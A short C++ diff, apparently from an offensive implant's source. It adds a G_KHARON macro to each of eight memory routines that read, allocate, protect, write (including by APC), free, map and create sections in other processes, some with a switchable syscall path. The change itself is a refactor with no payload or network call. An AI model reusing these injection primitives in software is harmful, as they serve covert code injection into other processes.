@@ -7,6 +7,7 @@ auto DECLFN Memory::Read(
     _Out_ SIZE_T* Reads,
     _In_  HANDLE  Handle
 ) -> BOOL {
+    G_KHARON
     return Self->Krnl32.ReadProcessMemory( Handle, Base, Buffer, Size, Reads );
 }
 
@@ -17,6 +18,7 @@ auto DECLFN Memory::Alloc(
     _In_ ULONG Protect,
     _In_ HANDLE Handle
 ) -> PVOID {
+    G_KHARON
     PVOID BaseAddress = NULL;
 
     if ( Self->Sys->Enabled ) {
@@ -48,6 +50,7 @@ auto DECLFN Memory::Protect(
     _Out_ ULONG* OldProt,
     _In_  HANDLE Handle
 ) -> BOOL {
+    G_KHARON
     BOOL Success = FALSE;
 
     if ( Self->Sys->Enabled ) {
@@ -77,6 +80,7 @@ auto DECLFN Memory::WriteAPC(
     _In_ BYTE*  Buffer,
     _In_ ULONG  Size
 ) -> BOOL {
+    G_KHARON
     HANDLE      ThreadHandle = NULL;
     NTSTATUS    NtStatus     = STATUS_SUCCESS;
 
@@ -110,6 +114,7 @@ auto DECLFN Memory::Write(
     _In_ ULONG  Size,
     _In_ HANDLE Handle
 ) -> BOOL {
+    G_KHARON
     BOOL      Success = FALSE;
     ULONG_PTR Written = 0;
 
@@ -134,6 +139,7 @@ auto DECLFN Memory::Free(
     _In_ ULONG  FreeType,
     _In_ HANDLE Handle
 ) -> BOOL {
+    G_KHARON
     if ( !Handle ) {
         return Self->Krnl32.VirtualFree( Base, Size, FreeType );
     } else {
@@ -153,6 +159,7 @@ auto DECLFN Memory::MapView(
     _In_        ULONG           AllocationType,
     _In_        ULONG           PageProtection
 ) -> LONG {
+    G_KHARON
     LONG RetStatus = STATUS_UNSUCCESSFUL;
 
     if ( Self->Sys->Enabled ) {
@@ -173,6 +180,7 @@ auto DECLFN Memory::CreateSection(
     _In_     ULONG              AllocationAttributes,
     _In_opt_ HANDLE             FileHandle
 ) -> LONG {
+    G_KHARON
     LONG RetStatus = STATUS_UNSUCCESSFUL;
 
     if ( Self->Sys->Enabled ) {
